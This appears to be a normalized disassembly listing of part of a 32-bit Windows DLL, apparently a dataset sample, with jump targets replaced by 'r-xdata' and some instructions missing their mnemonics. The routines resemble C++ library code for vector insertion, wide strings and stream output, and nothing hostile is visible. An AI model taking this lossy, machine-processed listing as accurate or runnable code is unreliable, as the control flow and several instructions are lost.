sub_100046fe
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_100016a9
push [ esp + 0x10 ]
mov ecx esi
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_10001450
mov eax esi
pop esi
retn 0x10
sub_10004728
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0xc ]
mov eax [ edi + 0x10 ]
sub eax ebx
push 0x1c
cdq
pop ecx
idiv ecx
test eax eax
jne r-xdata
lea esi [ ebp - 0x8 ]
call sub_10018308
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] eax
jmp r-xdata
call sub_10024832
cmp eax [ ebp - 0x8 ]
je r-xdata
push [ ebp + 0x14 ]
mov ecx edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
call sub_100047d6
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x10 ]
call sub_10018308
push [ ebp - 0x4 ]
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_10004a68
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x10
mov eax [ ebp + 0x14 ]
sub eax [ ebp - 0x4 ]
push 0x1c
cdq
pop ecx
idiv ecx
mov [ ebp - 0x4 ] eax
sub_100047a6
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10004fcf
mov eax [ ebp + 0xc ]
imul eax eax 0x1c
add esp 0x14
add eax [ ebp + 0x8 ]
pop edi
leave
retn 0xc
sub_100047d6
push 0x54
mov eax sub_1004d9ee
call sub_100282a2
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov esi ecx
mov ecx [ esi + 0xc ]
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x58 ] eax
test ecx ecx
jne r-xdata
mov eax [ esi + 0x14 ]
sub eax ecx
push 0x1c
cdq
pop ebx
idiv ebx
mov ebx eax
xor ebx ebx
jmp r-xdata
call sub_100282fe
retn 0x10
mov eax [ esi + 0x10 ]
sub eax ecx
push 0x1c
cdq
pop ecx
idiv ecx
mov ecx 0x9249249
mov edx ecx
sub edx eax
cmp edx edi
jae r-xdata
test edi edi
je r-xdata
add eax edi
cmp ebx eax
jae r-xdata
call sub_1001827a
mov eax [ esi + 0x10 ]
sub eax [ ebp + 0x14 ]
push 0x1c
cdq
pop ecx
idiv ecx
push [ ebp - 0x58 ]
cmp eax edi
jae r-xdata
mov edx ebx
shr edx 0x1
sub ecx edx
cmp ecx ebx
jae r-xdata
lea ecx [ ebp - 0x4c ]
call sub_1000136c
imul edi edi 0x1c
mov [ ebp - 0x4 ] 0x5
mov ebx [ esi + 0x10 ]
mov ecx ebx
sub ecx edi
push ebx
mov edx ebx
mov [ ebp - 0x58 ] ecx
call sub_10004f31
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x14 ]
mov esi [ ebp - 0x58 ]
mov [ ebp - 0x54 ] eax
cmp eax esi
je r-xdata
lea ecx [ ebp - 0x30 ]
call sub_1000136c
mov ebx edi
imul ebx ebx 0x1c
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0x14 ]
push [ esi + 0x10 ]
lea edx [ ebx + ecx ]
call sub_10004f31
mov [ ebp - 0x4 ] 0x3
mov eax [ esi + 0x10 ]
sub eax [ ebp + 0x14 ]
lea ecx [ ebp - 0x30 ]
push ecx
push 0x1c
pop ecx
cdq
idiv ecx
sub edi eax
push edi
push [ esi + 0x10 ]
call sub_100047a6
mov [ ebp - 0x4 ] 0x2
add [ esi + 0x10 ] ebx
mov esi [ esi + 0x10 ]
mov edi [ ebp + 0x14 ]
sub esi ebx
jmp r-xdata
add ebx edx
xor ebx ebx
jmp r-xdata
lea esi [ edi + eax ]
mov edi eax
cmp eax esi
je r-xdata
sub ebx esi
cmp edi esi
jne r-xdata
mov ecx ebx
call sub_10001745
mov [ ebp - 0x50 ] eax
mov eax [ ebp + 0x14 ]
sub eax [ esi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
push [ ebp - 0x58 ]
and [ ebp - 0x5c ] 0x0
and [ ebp - 0x4 ] 0x0
push edi
mov [ ebp - 0x54 ] eax
imul eax eax 0x1c
add eax [ ebp - 0x50 ]
push eax
call sub_100047a6
push [ ebp + 0x14 ]
mov edx [ ebp - 0x50 ]
mov ecx [ esi + 0xc ]
mov [ ebp - 0x5c ] 0x1
call sub_10004f31
mov eax [ ebp - 0x54 ]
push [ esi + 0x10 ]
mov ecx [ ebp + 0x14 ]
lea edx [ eax + edi ]
imul edx edx 0x1c
add edx [ ebp - 0x50 ]
mov [ ebp - 0x5c ] 0x2
call sub_10004f31
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x10 ]
sub eax ecx
cdq
push 0x1c
pop ecx
idiv ecx
add edi eax
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ebx eax
cmp ebx eax
jae r-xdata
lea ecx [ ebp - 0x4c ]
push 0xffffffff
push 0x0
lea eax [ ebp - 0x4c ]
push eax
mov ecx edi
call sub_10001450
add edi 0x1c
cmp edi esi
jne r-xdata
sub esi 0x1c
lea eax [ ebx + esi ]
push eax
mov ecx esi
call sub_10005119
pop ecx
cmp esi [ ebp - 0x54 ]
jne r-xdata
mov eax [ ebp + 0x14 ]
push 0xffffffff
push 0x0
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
call sub_10001450
add edi 0x1c
lea ecx [ ebp - 0x30 ]
jmp r-xdata
mov eax [ ebp - 0x50 ]
imul ebx ebx 0x1c
imul edi edi 0x1c
add ebx eax
add edi eax
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] edi
mov [ esi + 0xc ] eax
jmp r-xdata
push [ esi + 0x10 ]
call sub_10001728
push [ esi + 0xc ]
call sub_100242e6
pop ecx
push 0x0
push 0x1
call sub_10001500
sub_100048f4
cmp [ ebp - 0x5c ] 0x1
jle r-xdata
xor esi esi
cmp [ ebp - 0x5c ] esi
jle r-xdata
mov ecx [ ebp - 0x54 ]
mov eax [ ebp - 0x50 ]
imul ecx ecx 0x1c
add ecx eax
push ecx
call sub_10001728
push [ ebp - 0x50 ]
call sub_100242e6
pop ecx
push esi
push esi
call sub_10027dd1
mov eax [ esi + 0x10 ]
sub eax [ ebp + 0x14 ]
push 0x1c
cdq
pop ecx
idiv ecx
push [ ebp - 0x58 ]
cmp eax edi
jae r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
imul eax eax 0x1c
add eax [ ebp - 0x50 ]
imul ecx ecx 0x1c
add ecx [ ebp - 0x50 ]
push ecx
call sub_10001728
lea ecx [ ebp - 0x4c ]
call sub_1000136c
imul edi edi 0x1c
mov [ ebp - 0x4 ] 0x5
mov ebx [ esi + 0x10 ]
mov ecx ebx
sub ecx edi
push ebx
mov edx ebx
mov [ ebp - 0x58 ] ecx
call sub_10004f31
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x14 ]
mov esi [ ebp - 0x58 ]
mov [ ebp - 0x54 ] eax
cmp eax esi
je r-xdata
lea ecx [ ebp - 0x30 ]
call sub_1000136c
mov ebx edi
imul ebx ebx 0x1c
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0x14 ]
push [ esi + 0x10 ]
lea edx [ ebx + ecx ]
call sub_10004f31
mov [ ebp - 0x4 ] 0x3
mov eax [ esi + 0x10 ]
sub eax [ ebp + 0x14 ]
lea ecx [ ebp - 0x30 ]
push ecx
push 0x1c
pop ecx
cdq
idiv ecx
sub edi eax
push edi
push [ esi + 0x10 ]
call sub_100047a6
mov [ ebp - 0x4 ] 0x2
add [ esi + 0x10 ] ebx
mov esi [ esi + 0x10 ]
mov edi [ ebp + 0x14 ]
sub esi ebx
jmp r-xdata
lea esi [ edi + eax ]
mov edi eax
cmp eax esi
je r-xdata
sub ebx esi
cmp edi esi
jne r-xdata
lea ecx [ ebp - 0x4c ]
push 0xffffffff
push 0x0
lea eax [ ebp - 0x4c ]
push eax
mov ecx edi
call sub_10001450
add edi 0x1c
cmp edi esi
jne r-xdata
sub esi 0x1c
lea eax [ ebx + esi ]
push eax
mov ecx esi
call sub_10005119
pop ecx
cmp esi [ ebp - 0x54 ]
jne r-xdata
mov eax [ ebp + 0x14 ]
push 0xffffffff
push 0x0
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
call sub_10001450
add edi 0x1c
lea ecx [ ebp - 0x30 ]
jmp r-xdata
push 0x0
push 0x1
call sub_10001500
call sub_100282fe
retn 0x10
sub_10004a68
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push edi
push [ ebp + 0x8 ]
lea edi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
call sub_10003352
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax esi
pop edi
leave
retn 0x4
sub_10004a96
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push [ ebp + 0xc ]
mov ebx eax
push [ ebp + 0x8 ]
call sub_10004f52
pop ecx
pop ecx
mov eax ebx
pop ebx
leave
retn
sub_10004ab3
push 0x20
mov eax sub_1004cf7a
call sub_10028203
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_1000136c
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
mov ecx eax
call sub_10005562
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000136c
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10001500
mov eax [ ebp + 0x8 ]
call sub_100282db
retn
sub_10004afa
push 0x14
mov eax sub_1004ed01
call sub_10028236
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x18 ] ebx
call sub_100246bb
mov esi eax
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x18 ]
cmp eax ebx
pop ecx
jle r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_100053bb
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
cmp eax esi
jle r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
sub eax esi
mov ebx eax
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x28 ]
mov eax [ ecx ]
push esi
push [ ebp + 0xc ]
call [ eax + 0x20 ]
cmp eax esi
je r-xdata
test ebx ebx
jle r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
test ebx ebx
jle r-xdata
mov [ ebp - 0x18 ] 0x4
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_1000534e
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call sub_1000d05d
mov eax edi
call sub_100282db
retn
push 0x0
push [ ebp - 0x18 ]
call sub_100039ed
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
and [ eax + 0x18 ] 0x0
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_1000534e
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
dec ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x4
dec ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x4
jmp r-xdata
sub_10004c20
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10003dcd
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10004c53
push 0x18
mov eax sub_1004ecdc
call sub_10028236
mov edi [ ebp + 0x8 ]
push 0x22
pop esi
lea eax [ ebp - 0x24 ]
xor ebx ebx
push eax
mov [ ebp - 0x1c ] ebx
call sub_100053bb
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x20 ] bl
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov [ eax + 0x18 ] ebx
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x1c ] ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x18 ]
cmp ecx 0x1
jg r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x24 ]
push eax
call sub_1000d05d
mov eax edi
call sub_100282db
retn
push ebx
push [ ebp - 0x1c ]
call sub_100039ed
dec ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x18 ] ebx
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x28 ]
push esi
call sub_1000534e
movzx eax ax
mov esi 0xffff
mov ecx esi
cmp cx ax
jne r-xdata
cmp [ ebp - 0x1c ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ eax + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
cmp [ ebp - 0x1c ] ebx
jne r-xdata
mov [ ebp - 0x1c ] 0x4
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x18 ] ebx
jle r-xdata
cmp [ ebp - 0x18 ] ebx
jle r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_1000534e
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_1000534e
movzx eax ax
mov ecx esi
cmp cx ax
jne r-xdata
dec [ ebp - 0x18 ]
jmp r-xdata
mov [ ebp - 0x1c ] 0x4
dec [ ebp - 0x18 ]
jmp r-xdata
mov [ ebp - 0x1c ] 0x4
sub_10004d40
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
xor ebx ebx
or ecx 0x4
cmp [ eax + 0x28 ] ebx
jne r-xdata
push 0x1
push eax
call sub_10003dcd
mov [ ebp - 0x4 ] ebx
mov eax r-xdata
retn
or ecx 0x4
sub_10004da9
push 0x1c
mov eax sub_1004ecb7
call sub_10028236
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x14 ]
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x18 ]
xor esi esi
cmp eax esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] ecx
jle r-xdata
mov [ ebp - 0x1c ] esi
cmp eax ecx
jbe r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
sub eax ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
xor ebx ebx
cmp [ ebp - 0x1c ] esi
jbe r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x18 ] esi
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call sub_100053bb
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] esi
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0xc ]
mov esi [ eax + edi + 0x28 ]
push ebx
call sub_10005326
movzx eax [ eax ]
push eax
mov ecx esi
call sub_1000534e
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
cmp [ ebp - 0x18 ] esi
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_1000534e
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x28 ]
push eax
call sub_1000d05d
mov eax edi
call sub_100282db
retn
push esi
push [ ebp - 0x18 ]
call sub_100039ed
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov [ eax + 0x18 ] esi
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0x1c ] esi
jbe r-xdata
inc ebx
xor esi esi
jmp r-xdata
or [ ebp - 0x18 ] 0x4
xor esi esi
dec [ ebp - 0x1c ]
jmp r-xdata
or [ ebp - 0x18 ] 0x4
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_1000534e
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jae r-xdata
dec [ ebp - 0x1c ]
jmp r-xdata
or [ ebp - 0x18 ] 0x4
sub_10004eff
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10003dcd
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10004f31
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_10005024
add esp 0xc
pop edi
leave
retn 0x4
sub_10004f52
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x4 ] 0x0
push esi
push edi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_100051c8
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_10008a30
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
push 0x0
mov ecx ebx
mov [ ebp - 0x18 ] eax
mov [ ebx + 0x18 ] 0x7
call sub_100016a9
push [ ebp + 0xc ]
lea esi [ ebp - 0x14 ]
sub esp 0xc
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0xc
mov edi esp
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call sub_100050a9
pop edi
mov eax ebx
pop esi
leave
retn
sub_10004fcf
push 0x8
mov eax sub_1004ce96
call sub_10028236
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
call sub_100282db
retn
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
call sub_100019c2
dec [ ebp + 0xc ]
add [ ebp + 0x8 ] 0x1c
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
sub_10004fff
mov esi [ ebp - 0x14 ]
jmp r-xdata
push 0x0
cmp esi [ ebp + 0x8 ]
jne r-xdata
push 0x1
mov ecx esi
call sub_10001500
add esi 0x1c
push 0x0
call sub_10027dd1
call sub_100282db
retn
sub_10005024
push 0x2c
mov eax sub_1004d023
call sub_100282a2
mov esi edx
xor ebx ebx
mov edi ecx
push ebx
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x18 ] 0x7
call sub_100016a9
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_10001500
mov eax esi
call sub_100282fe
retn
lea eax [ ebp - 0x30 ]
push eax
mov ecx esi
call sub_100019c2
push esi
mov ecx edi
call sub_10005119
add esi 0x1c
pop ecx
mov [ ebp - 0x34 ] esi
add edi 0x1c
jmp r-xdata
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_10005077
mov esi [ ebp - 0x38 ]
jmp r-xdata
push 0x0
cmp esi [ ebp - 0x34 ]
jne r-xdata
push 0x1
mov ecx esi
call sub_10001500
add esi 0x1c
push 0x0
call sub_10027dd1
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_10001500
mov eax esi
call sub_100282fe
retn
sub_100050a9
push 0x4
mov eax sub_1004e410
call sub_10028236
and [ ebp - 0x4 ] 0x0
call sub_100282db
retn 0x20
lea ecx [ ebp + 0xc ]
call sub_10005274
push [ ebp + 0x14 ]
movzx esi [ eax ]
call sub_10003950
mov edx [ eax ]
pop ecx
push esi
mov ecx eax
call [ edx + 0x20 ]
mov ecx [ ebp + 0x8 ]
movzx eax ax
push eax
push 0x1
call sub_1000517a
lea ecx [ ebp + 0xc ]
call sub_10005239
jmp r-xdata
lea eax [ ebp + 0x18 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10008559
test al al
jne r-xdata
sub_10005119
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp eax ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_100242d7
leave
retn
push ebx
push esi
push edi
lea edx [ eax + 0x4 ]
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea ebx [ ecx + 0x4 ]
mov edi edx
mov esi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi ebx
lea esi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ecx + 0x14 ]
mov edx [ eax + 0x14 ]
mov [ eax + 0x14 ] esi
mov esi [ ecx + 0x18 ]
mov [ ecx + 0x14 ] edx
mov edx [ eax + 0x18 ]
pop edi
mov [ eax + 0x18 ] esi
pop esi
mov [ ecx + 0x18 ] edx
pop ebx
sub_1000517a
push ebx
mov ebx [ esp + 0x8 ]
push edi
or eax 0xffffffff
mov edi ecx
sub eax [ edi + 0x14 ]
cmp eax ebx
ja r-xdata
test ebx ebx
jbe r-xdata
call sub_10022f44
mov eax edi
pop edi
pop ebx
retn 0x8
push esi
mov esi [ edi + 0x14 ]
push 0x0
add esi ebx
push esi
mov ecx edi
call sub_100016c7
test al al
je r-xdata
pop esi
push [ esp + 0x14 ]
mov ecx edi
push ebx
push [ edi + 0x14 ]
call sub_100051ee
push esi
mov ecx edi
call sub_100016a9
sub_100051c8
cmp [ eax + 0x18 ] 0x8
jb r-xdata
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
push eax
mov eax [ eax + 0x14 ]
lea eax [ ecx + eax * 2 ]
mov ecx [ esp + 0x8 ]
push eax
call sub_100052d6
mov eax [ esp + 0x4 ]
retn 0x4
sub_100051ee
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_100052ac
add esp 0xc
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
mov dx [ ebp + 0x10 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
sub_10005239
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
add [ esi + 0x4 ] 0x2
mov eax esi
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_10024832
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10024832
mov eax [ eax + 0x14 ]
lea eax [ ecx + eax * 2 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_10005274
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_10024832
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10024832
mov eax [ eax + 0x14 ]
lea eax [ ecx + eax * 2 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_100052ac
mov ecx [ esp + 0xc ]
test ecx ecx
jbe r-xdata
mov eax [ esp + 0x4 ]
retn
mov eax [ esp + 0x8 ]
movzx edx ax
mov eax edx
shl edx 0x10
push edi
mov edi [ esp + 0x8 ]
or eax edx
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
pop edi
sub_100052d6
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
and [ edi ] 0x0
test esi esi
je r-xdata
call sub_10024832
test ebx ebx
je r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x8
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
lea eax [ eax + ecx * 2 ]
cmp ebx eax
jbe r-xdata
mov eax [ eax ]
mov [ edi ] esi
mov [ edi + 0x4 ] ebx
mov eax edi
pop edi
pop esi
pop ebx
retn 0x8
sub_10005326
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi [ esi + 0x14 ]
jbe r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_10024832
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + edi * 2 ]
pop edi
pop esi
retn 0x4
sub_1000534e
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
push [ esp + 0x4 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
mov eax [ esp + 0x4 ]
mov [ ecx ] ax
jmp r-xdata
test eax eax
jle r-xdata
movzx eax ax
retn 0x4
sub_1000538a
push ecx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
test [ eax + 0x8 ] 0x6
jne r-xdata
mov eax esi
pop ecx
retn
mov eax [ eax + 0x28 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x30 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
push 0x0
push 0x4
add edx esi
call sub_100039ed
sub_100053bb
push 0x0
mov eax sub_1004efa9
call sub_10028203
mov ebx [ ebp + 0x8 ]
mov [ ebx ] edi
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x28 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea ecx [ eax + 0x4 ]
call sub_1002312c
mov eax [ edi ]
mov eax [ eax + 0x4 ]
cmp [ eax + edi + 0x8 ] 0x0
sete al
mov [ ebx + 0x4 ] al
mov eax ebx
call sub_100282db
retn 0x4
mov eax [ eax + 0x2c ]
test eax eax
je r-xdata
mov esi eax
call sub_1000538a
sub_1000541a
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ edi + 0x14 ] ebx
jae r-xdata
mov eax [ edi + 0x14 ]
sub eax ebx
mov ebx [ ebp + 0x10 ]
cmp eax ebx
jae r-xdata
call sub_10022f7c
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax ebx
jbe r-xdata
mov ebx eax
mov [ ebp + 0x10 ] ebx
call sub_10022f44
